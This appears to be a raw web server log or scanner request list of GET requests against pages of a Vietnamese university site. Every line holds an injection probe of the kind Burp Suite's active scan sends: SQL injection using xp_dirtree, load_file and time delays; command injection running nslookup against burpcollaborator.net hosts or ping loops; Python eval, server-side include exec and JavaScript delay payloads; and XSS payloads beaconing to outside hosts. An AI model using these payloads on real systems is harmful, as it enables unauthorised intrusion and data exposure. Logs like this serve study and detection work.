GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c8irc5vv9h7fx0q03utaey5mszj5b45swjkd73vs.burpcollab'%2b'orator.net%5cclh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm'%22%600%26nslookup%20-q%3dcname%20dhyh40uegce2zvz8ty9jxalxyo4g2jqged13ps.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt%26nslookup%20-q%3dcname%20gp9kc32hofm57y7b11hm5dt06rcjanyimf95xu.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20gp9kc32hofm57y7b11hm5dt06rcjanyimf95xu.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt'%22%600%26nslookup%20-q%3dcname%20kwkoj79lvjt9e2ef85oqch04dvjnhs5ptmgc41.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm%7cecho%20m0ly6x3fu0%20qau88i4lhj%7c%7ca%20%23'%20%7cecho%20m0ly6x3fu0%20qau88i4lhj%7c%7ca%20%23%7c%22%20%7cecho%20m0ly6x3fu0%20qau88i4lhj%7c%7ca%20%23/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ktmt'%7cecho%207bnfavagyc%20t1bp7fezhq%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm%26nslookup%20-q%3dcname%20y102olez0xynjgjtdjt4hv5ii9o1m4azywlm9b.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20y102olez0xynjgjtdjt4hv5ii9o1m4azywlm9b.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6y5altb7x5vvgog1arqce32qfhl9k38u0iu5kt9.burpcollab'%2b'orator.net%5cpkd'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt%7cecho%20f1z5u34g4d%20otqcpc8li0%7c%7ca%20%23'%20%7cecho%20f1z5u34g4d%20otqcpc8li0%7c%7ca%20%23%7c%22%20%7cecho%20f1z5u34g4d%20otqcpc8li0%7c%7ca%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt%26nslookup%20-q%3dcname%20xab1xkny9w7msfssmi23quehr8x0v5j07xunic.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20xab1xkny9w7msfssmi23quehr8x0v5j07xunic.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ktmt%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm%7cecho%206hdu1pmtop%20len6sg01v7%7c%7ca%20%23'%20%7cecho%206hdu1pmtop%20len6sg01v7%7c%7ca%20%23%7c%22%20%7cecho%206hdu1pmtop%20len6sg01v7%7c%7ca%20%23/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxqr1dk3ypwnm8f8s2ii36uuh78d0cu0lt9nwdk2.burpcollab'%2b'orator.net%5csdh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-khmt'%7cecho%20s0y2hvfwp8%20cc1ms0g00y%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3'.sleep(20).'/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt'%22%600%26nslookup%20-q%3dcname%20a0benxdbz9xzisi5cvsgg74uhlndm4a1yylo9d.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttm'%7cecho%20oma6hjmtu2%20xow6cudwt7%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt%7cecho%2024hsy4u4nq%20kaepsmfbji%7c%7ca%20%23'%20%7cecho%2024hsy4u4nq%20kaepsmfbji%7c%7ca%20%23%7c%22%20%7cecho%2024hsy4u4nq%20kaepsmfbji%7c%7ca%20%23/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?(select%20load_file('%5c%5c%5c%5cv95zwimw8u6krdrqlg11psdfq6wyvsjjl7fu5iu.burpcollaborator.net%5c%5clko'))=1 ,1
GET /index.php/2017/03/13/ban-quan-ly-du-an'%7cecho%20oahe7bglq2%20fcj03smo94%20%23xzwx/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-khmt%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt%26nslookup%20-q%3dcname%20rkfv7exsjqhg292mwccx0oob127u6lugid53ts.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20rkfv7exsjqhg292mwccx0oob127u6lugid53ts.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttm%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%2b(select%20load_file('%5c%5c%5c%5cjqdnd63kpin8818e24ip6gu37udmcg073vxin6c.burpcollaborator.net%5c%5cdgg'))%2b'=1 ,1
GET /index.php/2017/03/13/ban-quan-ly-du-an%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm'%7cecho%206ip2ehycyr%201fs3g6is0a%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt%7cecho%201vb4ncxd3h%20ybnngbemw8%7c%7ca%20%23'%20%7cecho%201vb4ncxd3h%20ybnngbemw8%7c%7ca%20%23%7c%22%20%7cecho%201vb4ncxd3h%20ybnngbemw8%7c%7ca%20%23/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ktmt'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm'%7cecho%20uq5yi7pu2w%20wrf1zkfyzm%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt'%7cecho%20jmqo4r3ool%20ki9adoq7nx%20%23xzwx/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1%20into%20outfile%20'%5c%5c%5c%5cb7jfuykc6a40ptp6jwzhn8bvomuet8hzlnfa5yu.burpcollaborator.net%5c%5cvkc'%3b%20--%20=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt'%7cecho%20uf4c38pgit%20gucec4eb2r%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-khmt'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttm'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/ban-quan-ly-du-an'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt'%7cecho%20yst6825ssa%20mcllpsb0xh%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3'%22%600%26nslookup%20-q%3dcname%205x39ksa6w4uufnf09qpbd21pegk8j07xvuik69.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3%26nslookup%20-q%3dcname%20p9ztwcmq8o6er7rkla1vpmd9q0wsvkjf7cu2ir.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20p9ztwcmq8o6er7rkla1vpmd9q0wsvkjf7cu2ir.burpcollaborator.net.%26%60'/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3%7cecho%20t12e3rqwu3%207si5bff1z8%7c%7ca%20%23'%20%7cecho%20t12e3rqwu3%207si5bff1z8%7c%7ca%20%23%7c%22%20%7cecho%20t12e3rqwu3%207si5bff1z8%7c%7ca%20%23/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1%20waitfor%20delay'0%3a0%3a20'--=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1)waitfor%20delay'0%3a0%3a20'--=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1%2c0)waitfor%20delay'0%3a0%3a20'--=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-3'%7cecho%208rt9gbneol%2024idw1fm98%20%23xzwx/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ktmt'%2b(function()%7bif(typeof%20f70ft%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bf70ft%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22os6%22%20value%3d%22nr5rea4oqm%22--%3e%3c!--%23set%20var%3d%22qu8%22%20value%3d%22pt7tgc6qso%22--%3e%3c!--%23echo%20var%3d%22os6%22--%3e%3c!--%23echo%20var%3d%22qu8%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20aese1xrbd9bzwsw5qv6gu7iuvl1dzdn5ltig84x.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttm'%2b(function()%7bif(typeof%20s8urv%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bs8urv%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/ban-quan-ly-du-an'%2b(function()%7bif(typeof%20k5n8s%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bk5n8s%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22pkw%22%20value%3d%22ojvs6bwpin%22--%3e%3c!--%23set%20var%3d%22rmy%22%20value%3d%22qlxu8dyrkp%22--%3e%3c!--%23echo%20var%3d%22pkw%22--%3e%3c!--%23echo%20var%3d%22rmy%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20b6iftyjc5a30oto6iwyhm8avnmtes4gwekb71vq.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-khmt'%2b(function()%7bif(typeof%20ukr4o%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bukr4o%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22olw%22%20value%3d%22nkvr7axojm%22--%3e%3c!--%23set%20var%3d%22qny%22%20value%3d%22pmxt9czqlo%22--%3e%3c!--%23echo%20var%3d%22olw%22--%3e%3c!--%23echo%20var%3d%22qny%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20a7ieuxkb694zpsp5jvzgn7buoludsfg7evbi16q.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22n9j%22%20value%3d%22m8iqv9ln7l%22--%3e%3c!--%23set%20var%3d%22pbl%22%20value%3d%22oaksxbnp9n%22--%3e%3c!--%23echo%20var%3d%22n9j%22--%3e%3c!--%23echo%20var%3d%22pbl%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%209v5diw8au8sydrd47unfb6ztckicgb432rzep2e.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm'%2b(function()%7bif(typeof%20kghbs%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bkghbs%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?110684275'%20or%20'9126'%3d'9126=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm'%2b(function()%7bif(typeof%20i1zue%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bi1zue%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22yvj%22%20value%3d%22xui1hk7ytw%22--%3e%3c!--%23set%20var%3d%220xl%22%20value%3d%22zwk3jm90vy%22--%3e%3c!--%23echo%20var%3d%22yvj%22--%3e%3c!--%23echo%20var%3d%220xl%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20kh5o47ulgje9z2zft59qxhl4yv4n2oqgo4lrbf0.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt'%2b(function()%7bif(typeof%20rg7bg%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3brg7bg%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?186971878'%20or%20'2074'%3d'2075=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt'%2b(function()%7bif(typeof%20liyt3%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bliyt3%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22f68%22%20value%3d%22e57is1if4d%22--%3e%3c!--%23set%20var%3d%22h8a%22%20value%3d%22g79ku3kh6f%22--%3e%3c!--%23echo%20var%3d%22f68%22--%3e%3c!--%23echo%20var%3d%22h8a%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%201su5fo52r0pqajaw4mk78ywl9cf4d71zznwamyb.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22d25%22%20value%3d%22c14gozed0b%22--%3e%3c!--%23set%20var%3d%22f47%22%20value%3d%22e36iq1gf2d%22--%3e%3c!--%23echo%20var%3d%22d25%22--%3e%3c!--%23echo%20var%3d%22f47%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20zor3bm10nylo6h6u0kg54wsj5ab296xyvms9ix7.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?173611952'%20or%202921%3d2921--%20=1 ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22tsb%22%20value%3d%22srawef4tqr%22--%3e%3c!--%23set%20var%3d%22vud%22%20value%3d%22utcygh6vst%22--%3e%3c!--%23echo%20var%3d%22tsb%22--%3e%3c!--%23echo%20var%3d%22vud%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20fexj12rgdeb4wxwaq06lucizvq1iznnfl3iq8ex.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?150334111'%20or%204231%3d4234--%20=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt'%2b(function()%7bif(typeof%20mxaoa%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bmxaoa%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%20and%20'2293'%3d'2293=1 ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22jy4%22%20value%3d%22ix3mk5ajwh%22--%3e%3c!--%23set%20var%3d%22l06%22%20value%3d%22kz5om7clyj%22--%3e%3c!--%23echo%20var%3d%22jy4%22--%3e%3c!--%23echo%20var%3d%22l06%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%205kq97sx6j4hu2n20wqcb02op1g786zursfp2fq4.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%20and%20'8223'%3d'8228=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%20and%208039%3d8039--%20=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%20and%205044%3d5049--%20=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-3'%2b(function()%7bif(typeof%20h88ez%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bh88ez%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/2017/03/13/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22mek%22%20value%3d%22ldjp08qmck%22--%3e%3c!--%23set%20var%3d%22ogm%22%20value%3d%22nflr2asoem%22--%3e%3c!--%23echo%20var%3d%22mek%22--%3e%3c!--%23echo%20var%3d%22ogm%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20806cnvd9z7xxiqi3ctseg54shjnbm3av8j56vuk.burpcollaborator.net%22%20--%3e/ ,1
GET /index.php/2017/03/13/bai-bao-cong-bo/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fyjl26lwzixgn1g1tvjb4zvni09614zsrifc22qr%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1%7d%7df06wi'%2f%22%3cflj9x=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttm/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fzx03kma0wyuofhfu9kp5dw1jeak2js7kx8rvhj6%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/ban-quan-ly-du-an/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2feo6ib11fndl36w690zgk4bsy5pbh9jxbnzhm7aw%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ktmt/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fd6kht0je5c32ovo8iyyjmaaxnotgrgf85wzjp7e%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/bai-bao-cong-bo/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fb4gfryhc3a10mtm6gwwhk88vlmrepcd44syfo3d%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1%25%7ds4e4x'%2f%22%3cfvg9b=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-khmt/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2f0yz4lnb1xzvpgigvalq6ex2kfbl3j27uxir5ht6%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2f0vw4in81uzspdidv7ln6bxzkcbi3g44wuko7ev3%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttm/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fii4m55vjhhf7000du3aoyfm2zt5l4bs3jrde32s%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fh9rlw4mi8g66rzrcl21nped1qswkunif832qseh%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/ban-quan-ly-du-an/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fsgcw3fttfrdhyaynsd8ywpkcx33v1xppgda00op%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2frgbv3etsfqdgy9ymsc8xwokbx23u1ypqfe91zpo%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ktmt/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fj0knn6dkzix8i1iec4spgg43hunmlm9e02upkd9%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1afihy%25%3erw5rn'%2f%22%3cnxddw=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-khmt/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fl1npo8em0kyaj3jgd6trhi55iwoomnaf13vqlea%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-cnpm/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fhavlx4ni9g76szscm22nqee1rsxkvnjfa34quej%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/bai-bao-khoa-hoc-ttm/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fslhw8fytkrih3a3nxddy1ppc238v6wuolcfz5nu%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
